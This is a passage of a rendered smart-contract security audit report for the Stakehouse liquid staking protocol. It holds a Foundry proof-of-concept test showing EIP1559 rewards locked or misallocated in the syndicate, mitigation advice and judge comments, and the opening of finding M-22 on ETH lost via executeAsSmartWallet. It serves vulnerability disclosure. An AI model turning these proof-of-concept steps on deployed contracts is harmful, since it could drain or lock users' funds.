class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUserEthBalanceBefore</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">eip1559Tips</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">) - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// nodeRunner, who is the collateralized SLOT holder for blsPubKeyFour, can claim rewards accrued up to the point of pulling the plug</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimRewardsAsNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyFour</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">eip1559Tips</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// more EIP1559 rewards are sent to the syndicate, which has no registered knot at this moment        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">syndicate</span><span class=\"mtk1\">().</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">eip1559Tips</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hours</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calling the claimRewards function by feesAndMevUser has no effect at this moment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyFour</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">feesAndMevUserEthBalanceBefore</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calling the claimRewardsAsNodeRunner function by nodeRunner reverts at this moment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Nothing received&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimRewardsAsNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyFour</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// however, the syndicate still holds the EIP1559 rewards received by it during the period when the only knot was de-registered</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">syndicate</span><span class=\"mtk1\">().</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">eip1559Tips</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hours</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\">, </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// For a different BLS public key, which is blsPubKeyTwo, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   do everything from funding a validator within default LSDN to minting derivatives.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">depositStakeAndMintDerivativesForDefaultNetwork</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">blsPubKeyTwo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calling the claimRewards function by feesAndMevUser reverts at this moment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">arithmeticError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Yet, calling the claimRewardsAsNodeRunner function by nodeRunner receives half of the EIP1559 rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   received by the syndicate during the period when it has no registered knots.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Because such rewards are not received by the syndicate after the derivatives are minted for blsPubKeyTwo,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   nodeRunner does not deserve these for blsPubKeyTwo. </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimRewardsAsNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyTwo</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">eip1559Tips</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Still, half of the EIP1559 rewards that were received by the syndicate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   during the period when the syndicate has no registered knots is locked in the syndicate.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">syndicate</span><span class=\"mtk1\">().</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">eip1559Tips</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-23\" style=\"position:relative;\"><a href=\"#tools-used-23\" aria-label=\"tools used 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-41\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-41\" aria-label=\"recommended mitigation steps 41 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>else</code> block of the <code>updateAccruedETHPerShares</code> function (<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L194-L196\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L194-L196</a>) can be updated to include logics that handle the EIP1559 rewards received by the syndicate during the period when it has no registered knots.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/376#issuecomment-1329395852\">vince0656 (Stakehouse) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>Node runners should index the chain when the knot is removed from the LSD network and update their fee recipient.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/376#issuecomment-1337088873\">LSDan (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I’m going to leave this in place but as a Medium.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-22-eth-sent-when-calling-executeassmartwallet-function-can-be-lost\" style=\"position:relative;\"><a href=\"#m-22-eth-sent-when-calling-executeassmartwallet-function-can-be-lost\" aria-label=\"m 22 eth sent when calling executeassmartwallet function can be lost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/377\">[M-22] ETH sent when calling <code>executeAsSmartWallet</code> function can be lost</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/377\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/174\">0xbepresent</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64</a></p>\n<p>Calling the <code>executeAsSmartWallet</code> function by the DAO further calls the <code>OwnableSmartWallet.execute</code> function. Since the <code>executeAsSmartWallet</code> function is <code>payable</code>, an ETH amount can be sent when calling it. However, since the sent ETH amount is not forwarded to the smart wallet contract, such sent amount can become locked in the <code>LiquidStakingManager</code> contract. For example, when the DAO attempts to call the <code>executeAsSmartWallet</code> function for sending some ETH to the smart wallet so the smart wallet can use it when calling its <code>execute</code> function, if the smart wallet’s ETH balance is also higher than this sent ETH amount, calling the <code>executeAsSmartWallet</code> function would not revert, and the sent ETH amount is locked in the <code>LiquidStakingManager</code> contract while such amount is deducted from the smart wallet’s ETH balance for being sent to the target address. Besides that this is against the intention of the DAO, the DAO loses the sent ETH amount that becomes locked in the <code>LiquidStakingManager</code> contract, and the node runner loses the amount that is unexpectedly deducted from the corresponding smart wallet’s ETH balance.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"123\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeAsSmartWallet</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;No wallet found&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IOwnableSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"124\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">callData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// F: [OSW-6A]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">.</span><span class=\"mtk11\">functionCallWithValue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">callData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">value</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// F: [OSW-6]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-37\" style=\"position:relative;\"><a href=\"#proof-of-concept-37\" aria-label=\"proof of concept 37 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please add the following code in <code>test\\foundry\\LSDNFactory.t.sol</code>.</p>\n<ol>\n<li>Add the following <code>receive</code> function for the POC purpose.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"125\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<ol start=\"2\">\n<li>Add the following test. This test will pass to demonstrate the described scenario.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" 